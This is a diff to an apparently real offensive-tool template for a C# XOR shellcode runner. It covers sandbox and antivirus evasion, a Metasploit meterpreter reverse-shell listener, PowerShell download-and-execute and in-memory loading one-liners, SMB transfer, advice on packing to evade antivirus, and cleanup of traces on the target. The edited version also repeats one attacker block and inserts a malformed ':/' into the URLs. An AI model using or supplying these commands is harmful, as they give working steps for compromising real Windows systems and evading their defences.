@@ -1,18 +1,18 @@
 meta:
-  name: "Simple Shellcode Runner, XOR (C#)"
+  name: "Simple Shellcode Runner, XOR (C#)*"
   category: "Shellcode Execution"
   description: |
     Simple shellcode runner in C# with XOR encryption and sandbox evasion.
-    
+
     Features:
     - XOR encryption for basic obfuscation (key: 0xfa)
     - Sleep-based sandbox detection (10 second delay)
     - Direct shellcode execution via VirtualAlloc + CreateThread
     - Minimal API footprint
-    
+
     This is a straightforward runner suitable for initial access or testing.
     The sleep-based evasion helps bypass automated sandboxes that skip delays.
-    
+
     WARNING: For authorized security testing only!
 
   effectiveness: medium
@@ -91,40 +91,74 @@ output:
     enabled: true
     command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
   launch_instructions: |
-    C# Simple XOR Shellcode Runner - Launch Instructions
+    # Start Listener
 
-    Start Listener:
-    $ msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    ```bash
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    ```
 
-    Transfer and Execute:
-    $ python3 -m http.server 80
-    $ powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; Start-Process {{ output_file }}"
+    # Transfer and Execute
 
-    Alternative (SMB):
-    $ impacket-smbserver share . -smb2support
-    $ copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }} && {{ output_file }}
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
 
-    In-Memory Execution:
-    $ python3 -m http.server 80
-    $ powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [SimpleRunner.Program]::Main(@())"
+    **Target:**
+    ```powershell
+    powershell -c "IWR -Uri http://{{ lhost }}:/{{ output_file }} -OutFile {{ output_file }}; Start-Process {{ output_file }}"
+    ```
 
-    Notes:
-    - XOR encrypted with key: 0x{{ xor_key }} (basic AV evasion)
+    # Alternative (SMB)
+
+    **Attacker:**
+    ```bash
+    impacket-smbserver share . -smb2support
+    ```
+
+    **Target:**
+    ```cmd
+    copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }} && {{ output_file }}
+    ```
+
+    # In-Memory Execution
+
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
+
+    **Target:**
+    ```powershell
+    powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}:/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [SimpleRunner.Program]::Main(@())"
+    ```
+
+    # Notes
+
+    - XOR encrypted with key: `0x{{ xor_key }}` (basic AV evasion)
     - 10-second sleep for sandbox evasion (sandboxes often skip delays)
     - Uses VirtualAlloc with RWX permissions for shellcode memory allocation
     - Executes shellcode in separate thread via CreateThread
-    - EXITFUNC=thread ensures clean exit without crashing process
-    - Reverse shell connects to {{ lhost }}:{{ lport }}
+    - `EXITFUNC=thread` ensures clean exit without crashing process
+    - Reverse shell connects to `{{ lhost }}:{{ lport }}`
     - Requires x64 Windows system
 
-    Troubleshooting:
-    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
-    - AV blocks: XOR is weak; consider AES encryption or packing (UPX, Enigma)
-    - Payload waits 10 seconds before execution (by design for sandbox evasion)
-    - Immediate termination: AV likely killed process; check Defender logs
-    - Binary won't run: Windows SmartScreen or AppLocker blocking
+    # Troubleshooting
 
-    Cleanup:
-    On target:
-    $ taskkill /F /IM {{ output_file }} 2>nul
-    $ del {{ output_file }}
+    - **No connection:** Check firewall rules on attacker (allow `{{ lport }}/tcp`)
+    - **AV blocks:** XOR is weak; consider AES encryption or packing (UPX, Enigma)
+    - **Payload waits 10 seconds** before execution (by design for sandbox evasion)
+    - **Immediate termination:** AV likely killed process; check Defender logs
+    - **Binary won't run:** Windows SmartScreen or AppLocker blocking
+
+    # Cleanup
+
+    **Target:**
+    ```cmd
+    taskkill /F /IM {{ output_file }} 2>nul
+    del {{ output_file }}
+    ```
